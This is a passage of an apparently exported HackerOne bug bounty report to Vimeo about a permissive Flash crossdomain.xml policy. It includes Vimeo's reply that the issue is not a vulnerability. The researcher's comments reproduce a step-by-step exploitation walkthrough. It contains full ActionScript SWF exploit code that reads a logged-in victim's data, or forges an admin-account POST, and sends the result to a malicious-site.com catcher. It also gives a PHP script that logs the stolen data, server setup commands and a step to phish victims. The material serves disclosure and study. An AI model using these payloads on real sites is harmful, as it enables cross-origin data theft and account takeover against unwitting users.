readRequest.method = URLRequestMethod.POST\u003cbr\u003e\n   readRequest.data = \u0026quot;{\\\u0026quot;name\\\u0026quot;:\\\u0026quot;CSRF-Admin\\\u0026quot;,\\\u0026quot;Group\\\u0026quot;:\\\u0026quot;admin\\\u0026quot;,\\\u0026quot;password\\\u0026quot;:\\\u0026quot;password\\\u0026quot;,\\\u0026quot;confirmPassword\\\u0026quot;:\\\u0026quot;password\\\u0026quot;}\u0026quot;;\u003cbr\u003e\n   readRequest.requestHeaders.push(header);\u003cbr\u003e\n   var getLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\u003cbr\u003e\n   try {\u003cbr\u003e\n    getLoader.load(readRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003c/p\u003e\n\n\u003cp\u003eprivate function eventHandler(event:Event):void {\u003cbr\u003e\n   // URL to which retrieved data is to be sent\u003cbr\u003e\n   var sendTo:String = \u0026quot;\u003ca title=\"http://www.malicious-site.com/crossdomain/catcher.php\" href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com%2Fcrossdomain%2Fcatcher.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.malicious-site.com/crossdomain/catcher.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003cbr\u003e\n   var sendRequest:URLRequest = new URLRequest(sendTo);\u003cbr\u003e\n   sendRequest.method = URLRequestMethod.POST;\u003cbr\u003e\n   sendRequest.data = event.target.data;\u003cbr\u003e\n   var sendLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   try {\u003cbr\u003e\n    sendLoader.load(sendRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003cbr\u003e\n }\u003c/p\u003e\n\n\u003ch1 id=\"part-2b622\"\u003e}\u003c/h1\u003e\n\n\u003ch1 id=\"4-compile-the-actionscript-with-xmmlc\"\u003e4) Compile the ActionScript with xmmlc:\u003c/h1\u003e\n\n\u003ch1 id=\"opt-flex-bin-mxmlc-crossdomain-xdomainxploit-as\"\u003e /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"5-move-the-compiled-swf-somewhere-inside-your-web-root\"\u003e5) Move the compiled SWF somewhere inside your web root\u003c/h1\u003e\n\n\u003ch1 id=\"mv-crossdomain-xdomainxploit-swf-var-www-crossdomain\"\u003emv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain\u003c/h1\u003e\n\n\u003ch1 id=\"6-create-and-save-the-catcher-file-this-php-file-takes-the-entire-data-portion-of-the-incoming-http-message-and-writes-it-to-a-file-in-tmp-you-can-get-a-lot-fancier-with-this-such-as-creating-a-separate-file-per-victim-or-by-parsing-the-file-within-php-and-only-writing-the-relevant-information-to-disk\"\u003e6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.\u003c/h1\u003e\n\n\u003cp\u003evi /var/www/catcher.php\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;?php\u003c/p\u003e\n\n\u003cp\u003e$data = file_get_contents(\u0026quot;php://input\u0026quot;);\u003cbr\u003e\n$ret = file_put_contents(\u0026#39;/tmp/thanks_for_sharing.txt\u0026#39;, $data, FILE_APPEND | LOCK_EX);\u003cbr\u003e\nif($ret === false) {\u003cbr\u003e\n die(\u0026#39;Error writing to file\u0026#39;);\u003cbr\u003e\n}\u003cbr\u003e\nelse { \u003cbr\u003e\n echo \u0026quot;$ret bytes written to file\u0026quot;;\u003cbr\u003e\n}\u003c/p\u003e\n\n\u003ch1 id=\"part-310c89a3a0\"\u003e?\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"7-install-php-if-it-is-not-already-installed\"\u003e7) Install PHP if it is not already installed:\u003c/h1\u003e\n\n\u003ch1 id=\"apt-get-install-php5\"\u003e apt-get install php5\u003c/h1\u003e\n\n\u003ch1 id=\"8-set-your-web-server-to-support-ssl\"\u003e8) Set your web server to support SSL.\u003c/h1\u003e\n\n\u003cp\u003e*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure=\u0026quot;false\u0026quot; attribute is not set, your flash object needs to have been loaded from a HTTPS site. \u003c/p\u003e\n\n\u003ch1 id=\"the-two-lines-below-show-you-how-to-make-a-self-signed-cert-http-charles-lescampeurs-org-2012-01-14-ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate-for-a-more-realistic-poc-you-would-want-to-purchase-a-valid-ssl-certificate-so-your-victim-user-does-not-get-any-ssl-errors\"\u003eThe two lines below show you how to make a self-signed cert(\u003ca title=\"http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\" href=\"/redirect?url=http%3A%2F%2Fcharles.lescampeurs.org%2F2012%2F01%2F14%2Fubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.\u003c/h1\u003e\n\n\u003cp\u003emake-ssl-cert generate-default-snakeoil --force-overwrite\u003cbr\u003e\n a2enmod ssl\u003c/p\u003e\n\n\u003ch1 id=\"a2ensite-default-ssl\"\u003e a2ensite default-ssl\u003c/h1\u003e\n\n\u003ch1 id=\"9-start-or-restart-your-web-server\"\u003e9) Start [or restart] your web server\u003c/h1\u003e\n\n\u003ch1 id=\"etc-init-d-apache2-restart\"\u003e /etc/init.d/apache2 restart\u003c/h1\u003e\n\n\u003cp\u003e10) Phish your victim to your site, \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com%2Fcrossdomain%2Fxdx.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.malicious-site.com/crossdomain/xdx.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e11) Hope the victim is currently logged in to the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e12) Collect and analyze your stolen data:\u003c/p\u003e\n\n\u003cp\u003ecat /tmp/thanks_for_sharing.txt\u003c/p\u003e\n\n\u003cp\u003e=====================================================================================\u003c/p\u003e\n\n\u003ch1 id=\"pls-read-this-following-articles-for-more-information\"\u003ePls Read this following Articles for more Information : \u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"http://sethsec.blogspot.in/2014/07/crossdomain-bing.html\" href=\"/redirect?url=http%3A%2F%2Fsethsec.blogspot.in%2F2014%2F07%2Fcrossdomain-bing.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://sethsec.blogspot.in/2014/07/crossdomain-bing.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\" href=\"/redirect?url=http%3A%2F%2Fgursevkalra.blogspot.in%2F2013%2F08%2Fbypassing-same-origin-policy-with-flash.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar\" href=\"/redirect?url=http%3A%2F%2Fsethsec.blogspot.in%2F2014%2F11%2Fcrossdomainxml-can-be-overly-permissive_18.html%3Fview%3Dsidebar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nBALAJI\u003c/p\u003e\n","weakness":{"id":32,"name":"Cryptographic Issues - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":26691,"file_name":"vimeo.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/026/691/e31d2e7571f326dfe8e8b8b809ec3911f0d5ade4/vimeo.png?response-content-disposition=attachment%3B%20filename%3D%22vimeo.png%22%3B%20filename%2A%3DUTF-8%27%27vimeo.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSC5UFWXL%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055720Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCwK%2B%2BlMufFx2twThN55FpWvSNFMRcTw6DIMXMwu3SRJgIgbfhKiC5W8N8YFQB0Nj1%2Boe6pAlr8Ti%2FvGEEHHH13JNkqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKRKppBQcflzJsWylyqRAzVMKZ6jWFrSD2Y9kWok2waN0zNoEyuNoms1kUC37gd2cWniMYOCGZa9pHJ%2BTGOcJDE8mr7X3wJV03PeWNx%2FJ3x1t1adSeplF3kKkxVzwMpsJiOYMPMNaXbK6aN%2FVxaTTjwIHJMTw7ej%2BNad1lrBkNYM8xmTFPzJdlIn3krUMQVcm66POZCl3IpgIriUdvRQsdjWZjnf%2FUXejEcDwlys5fmmpAap4FXWkuE4xPD5JITrqd71Zc4guVr49IYqaJ9P8ZOa39l8Cm9yOfvHOdc%2FHHkeb3dhc64lVpxLQxnIzdRkUBVcVDfLrNaCOxpa9K0SDMt9HK%2B6%2F6SozxEKFb7iD2%2BQkM42Rwtm3vBMeKEUDeFG3yO5gW6KJtirosz7Y3m8DdEylt%2F8air6KKuH0wjD%2B9LfO7%2FWKZCn3h7tRVYtr71OXTcV4jMC7Q6El1VpYoy1%2FUyJLt0VlyMhH1u00hOd2Ed613mjv9Lq0b8iTU4W3vlCcM%2FtjGgBfI2lPMbp3cacOsLTQtiqUw%2FMXKZM7aikuuh%2BML6aqv8FOusBAaUZsZRvtcfsxqJAwQO39V21wLoeubOAIV%2BtvLyfXzwltZABeAGkBPYy8xl5ryQb8Y%2BKG%2FfwUfCGsCxtOppNqsZCDg0JzwPVO8CdiGO1QqRKJpkb23agNpWEIAa8FY4BpDjQUZHUIl4jWVfFWH2sizzpICjQxnSI3JQpi2%2B9GAdI3gAmweVyhKgicRGn9QyAfoRtqO3YWntGA8EeCXAhyWW%2BxebF5JNSGoYhvM72O00zG1YKAYz%2F6ymrbrJmLpZ0WbBqG4d2%2BRi9F0TVfiKq0rdWihYUV%2FstwlGLcPIVuYIDnBH4oA5HYk7pFw%3D%3D\u0026X-Amz-Signature=84334e9181f53a6c33e48ce87668aacbeaa35956c26c37561dbb0c97d7e46135","file_size":25178,"type":"image/png"}],"allow_singular_disclosure_at":"2015-02-09T17:31:35.996Z","allow_singular_disclosure_after":-185718344.51446906,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":306895,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We don't believe this to be a vulnerability. Our root crossdomain.xml file contains the following directive:\r\n\r\n```\r\n\u003csite-control permitted-cross-domain-policies=\"by-content-type\"/\u003e\r\n```\r\n\r\nPer Adobe this means that requesting SWFs much check for additional crossdomain.xml policies at each subdirectory. So for example to access https://vimeo.com/settings a SWF much validate the cross domain policy against https://vimeo.com/settings/crossdomain.xml, which has the most restrictive policy:\r\n\r\n```\r\n\u003ccross-domain-policy\u003e\r\n    \u003callow-access-from domain=\"none\" secure=\"false\"/\u003e\r\n    \u003callow-http-request-headers-from domain=\"none\" headers=\"*\"/\u003e\r\n\u003c/cross-domain-policy\u003e\r\n```\r\n\r\nWe use the \"meta vs master policy\" style because there are a handful of url paths that we make accessible to SWFs, we deny all other requests via the restrictive crossdomain.xml you see above.\r\n\r\nThe relevant Adobe docs are here: http://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html#meta-vs-master-policies\r\n\r\nIf you believe this is still a vulnerability, please provide a proof of concept.","markdown_message":"\u003cp\u003eWe don\u0026#39;t believe this to be a vulnerability. Our root crossdomain.xml file contains the following directive:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;site-control permitted-cross-domain-policies=\u0026quot;by-content-type\u0026quot;/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePer Adobe this means that requesting SWFs much check for additional crossdomain.xml policies at each subdirectory. So for example to access \u003ca title=\"https://vimeo.com/settings\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fsettings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e a SWF much validate the cross domain policy against \u003ca title=\"https://vimeo.com/settings/crossdomain.xml\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2Fsettings%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/settings/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which has the most restrictive policy:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;cross-domain-policy\u0026gt;\n    \u0026lt;allow-access-from domain=\u0026quot;none\u0026quot; secure=\u0026quot;false\u0026quot;/\u0026gt;\n    \u0026lt;allow-http-request-headers-from domain=\u0026quot;none\u0026quot; headers=\u0026quot;*\u0026quot;/\u0026gt;\n\u0026lt;/cross-domain-policy\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe use the \u0026quot;meta vs master policy\u0026quot; style because there are a handful of url paths that we make accessible to SWFs, we deny all other requests via the restrictive crossdomain.xml you see above.\u003c/p\u003e\n\n\u003cp\u003eThe relevant Adobe docs are here: \u003ca title=\"http://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html#meta-vs-master-policies\" href=\"/redirect?url=http%3A%2F%2Fwww.adobe.com%2Fdevnet-docs%2Facrobatetk%2Ftools%2FAppSec%2Fxdomain.html%23meta-vs-master-policies\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html#meta-vs-master-policies\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you believe this is still a vulnerability, please provide a proof of concept.\u003c/p\u003e\n","automated_response":true,"created_at":"2015-01-09T05:49:07.653Z","updated_at":"2015-01-09T05:49:07.653Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":306896,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"URL : http://vimeo.com/crossdomain.xml\n============================================================================\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\n\u003c!DOCTYPE cross-domain-policy SYSTEM \"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd\"\u003e\n\u003ccross-domain-policy\u003e\n\u003csite-control permitted-cross-domain-policies=\"by-content-type\"/\u003e\n\u003callow-access-from domain=\"*\" secure=\"false\"/\u003e\n\u003callow-http-request-headers-from domain=\"*\" headers=\"*\"/\u003e\n============================================================================\n\nThe Vulnerability\n==============\nAs a general rule, if the following three conditions are met, there is problem:\n1. A crossdomain.xml file is hosted at the root of the host, for example: www.secret-site.com/crossdomain.xml.\n2. The crossdomain.xml is overly permissive.\n3. There is either sensitive information on www.secret-site.com or there are sensitive actions that can be performed on www.secret-site.com.\n\nIf #1 and #2 are met, but www.secret-site.com does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.\n\nHowever, if there are sensitive actions that can be performed or information that can be stolen, and www.secret-site.com has an overly permissive crossdomain.xml file, the application at www.secret-site.com is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from www.malicious-site.com is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of www.secret-site.com has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.\n\nNote: The most permissive configuration option is the following line: \u003callow-access-from domain=\"*\"\u003e. That is not the only overly permissive setting. Check out the reference papers listed above to find more.\n\nNote: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if www.secret-site.com requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.\n\nNote: In my examples, I use www as the hostname (www.secret-site.com).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the https://www.secret-site.com/crossdomain.xml contains \u003callow-access-from domain=\"*\"\u003e, but all of the sensitive transactions happen on https://secure.secret-site.com, there is no risk.  Of course, if https://secure.secret-site.com/crossdomain.xml exists and it also has an overly permissive policy, then we are back in business.  \n\nExploitation\n==========\nAnd now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. \n\n1) Install Adobe Flex:\n===================================================\napt-get install openjdk-6-jdk\n mkdir /opt/flex \n cd /opt/flex/ \n wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\n unzip flex_sdk_4.6.zip \n chmod -R a+rx /opt/flex/\n echo 'export PATH=/opt/flex/bin:$PATH' \u003e\u003e ~/.bashrc\n chmod 755 bin/mxmlc\n===================================================\n\n2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) \n==================================================\nmkdir /var/www/crossdomain\n mkdir ~/crossdomain\n cd ~\n git clone https://github.com/gursev/flash-xdomain-xploit.git\n cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/\n cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/\n vi ~/crossdomain/XDomainXploit.as\n=====================================================\n\nIf for some reason you don't have the git client or the git command in the previous box doesn't work, you can use wget:\n=====================================================\ncd /var/www/crossdomain\n wget https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html  \n cd ~/crossdomain\n wget https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\n vi ~/crossdomain/XDomainXploit.as\n======================================================\n\n3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev's comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.\n======================================================\n// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)\n// XDomainXploit.as\n\npackage {\n import flash.display.Sprite;\n import flash.events.*;\n import flash.net.URLRequestMethod;\n import flash.net.URLRequest;\n import flash.net.URLLoader;\n\n public class XDomainXploit extends Sprite {\n  public function XDomainXploit() {\n   // Target URL from where the data is to be retrieved\n   var readFrom:String = \"http://www.secret-site.com/account/info\";\n   var readRequest:URLRequest = new URLRequest(readFrom);\n   var getLoader:URLLoader = new URLLoader();\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\n   try {\n    getLoader.load(readRequest);\n   } catch (error:Error) {\n    trace(\"Error loading URL: \" + error);\n   }\n  }\n\n  private function eventHandler(event:Event):void {\n   // URL to which retrieved data is to be sent\n   var sendTo:String = \"http://malicious-site.com/catcher.php\"\n   var sendRequest:URLRequest = new URLRequest(sendTo);\n   sendRequest.method = URLRequestMethod.POST;\n   sendRequest.data = event.target.data;\n   var sendLoader:URLLoader = new URLLoader();\n   try {\n    sendLoader.load(sendRequest);\n   } catch (error:Error) {\n    trace(\"Error loading URL: \" + error);\n   }\n  }\n }\n}\n=======================================================\n\nIf you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:\n=======================================================\n// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)\n// POC Modified to send POSTs and append HTTP headers: Seth Art\n// XDomainXploit.as\n\npackage {\n import flash.display.Sprite;\n import flash.events.*;\n import flash.net.URLRequestMethod;\n import flash.net.URLRequest;\n import flash.net.URLLoader;\n import flash.net.URLRequestHeader;\n public class XDomainXploit3 extends Sprite {\n  public function XDomainXploit3() {\n   // Target URL from where the data is to be retrieved\n   var readFrom:String = \"https://www.secret-site.com/admin/add\";\n   var header:URLRequestHeader = new URLRequestHeader(\"Content-Type\", \"text/plain; charset=UTF-8\");\n   var readRequest:URLRequest = new URLRequest(readFrom);\n   readRequest.method = URLRequestMethod.POST\n   readRequest.data = \"{\\\"name\\\":\\\"CSRF-Admin\\\",\\\"Group\\\":\\\"admin\\\",\\\"password\\\":\\\"password\\\",\\\"confirmPassword\\\":\\\"password\\\"}\";\n   readRequest.requestHeaders.push(header);\n   var getLoader:URLLoader = new URLLoader();\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\n   try {\n    getLoader.load(readRequest);\n   } catch (error:Error) {\n    trace(\"Error loading URL: \" + error);\n   }\n  }\n\n  private function eventHandler(event:Event):void {\n   // URL to which retrieved data is to be sent\n   var sendTo:String = \"http://www.malicious-site.com/crossdomain/catcher.php\"\n   var sendRequest:URLRequest = new URLRequest(sendTo);\n   sendRequest.method = URLRequestMethod.POST;\n   sendRequest.data = event.target.data;\n   var sendLoader:URLLoader = new URLLoader();\n   try {\n    sendLoader.load(sendRequest);\n   } catch (error:Error) {\n    trace(\"Error loading URL: \" + error);\n   }\n  }\n }\n}\n========================================================\n\n4) Compile the ActionScript with xmmlc:\n========================================================\n /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as\n========================================================\n\n5) Move the compiled SWF somewhere inside your web root\n========================================================\nmv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain\n========================================================\n\n6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.\n=========================================================\nvi /var/www/catcher.php\n\n\u003c?php\n\n$data = file_get_contents(\"php://input\");\n$ret = file_put_contents('/tmp/thanks_for_sharing.txt', $data, FILE_APPEND | LOCK_EX);\nif($ret === false) {\n die('Error writing to file');\n}\nelse { \n echo \"$ret bytes written to file\";\n}\n?\u003e\n============================================================\n\n7) Install PHP if it is not already installed:\n============================================================\n apt-get install php5\n============================================================\n\n8) Set your web server to support SSL.\n============================================================\n*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure=\"false\" attribute is not set, your flash object needs to have been loaded from a HTTPS site. \n\nThe two lines below show you how to make a self-signed cert(http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.\n=============================================================\n make-ssl-cert generate-default-snakeoil --force-overwrite\n a2enmod ssl\n a2ensite default-ssl\n=============================================================\n\n9) Start [or restart] your web server\n=============================================================\n /etc/init.d/apache2 restart\n=============================================================\n\n10) Phish your victim to your site, www.malicious-site.com/crossdomain/xdx.html\n\n11) Hope the victim is currently logged in to the www.secret-site.com\n\n12) Collect and analyze your stolen data:\n\n cat /tmp/thanks_for_sharing.txt\n\n=====================================================================================\n\n\nPls Read this following Articles for more Information : \n===========================================\nhttp://sethsec.blogspot.in/2014/07/crossdomain-bing.html\n\nhttp://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\n\nhttp://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar","markdown_message":"\u003ch1 id=\"url-http-vimeo-com-crossdomain-xml\"\u003eURL : \u003ca title=\"http://vimeo.com/crossdomain.xml\" href=\"/redirect?url=http%3A%2F%2Fvimeo.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://vimeo.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/h1\u003e\n\n\u003cp\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026quot;\u003ca title=\"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd%22%3E\" href=\"/redirect?url=http%3A%2F%2Fwww.adobe.com%2Fxml%2Fdtds%2Fcross-domain-policy.dtd%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.adobe.com/xml/dtds/cross-domain-policy.dtd%22%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u0026lt;cross-domain-policy\u0026gt;\u003cbr\u003e\n\u0026lt;site-control permitted-cross-domain-policies=\u0026quot;by-content-type\u0026quot;/\u0026gt;\u003cbr\u003e\n\u0026lt;allow-access-from domain=\u0026quot;*\u0026quot; secure=\u0026quot;false\u0026quot;/\u0026gt;\u003c/p\u003e\n\n\u003ch1 id=\"allow-http-request-headers-from-domain-headers\"\u003e\u0026lt;allow-http-request-headers-from domain=\u0026quot;*\u0026quot; headers=\u0026quot;*\u0026quot;/\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"the-vulnerability\"\u003eThe Vulnerability\u003c/h1\u003e\n\n\u003cp\u003eAs a general rule, if the following three conditions are met, there is problem:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eA crossdomain.xml file is hosted at the root of the host, for example: \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eThe crossdomain.xml is overly permissive.\u003c/li\u003e\n\u003cli\u003eThere is either sensitive information on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or there are sensitive actions that can be performed on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIf #1 and #2 are met, but \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.\u003c/p\u003e\n\n\u003cp\u003eHowever, if there are sensitive actions that can be performed or information that can be stolen, and \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has an overly permissive 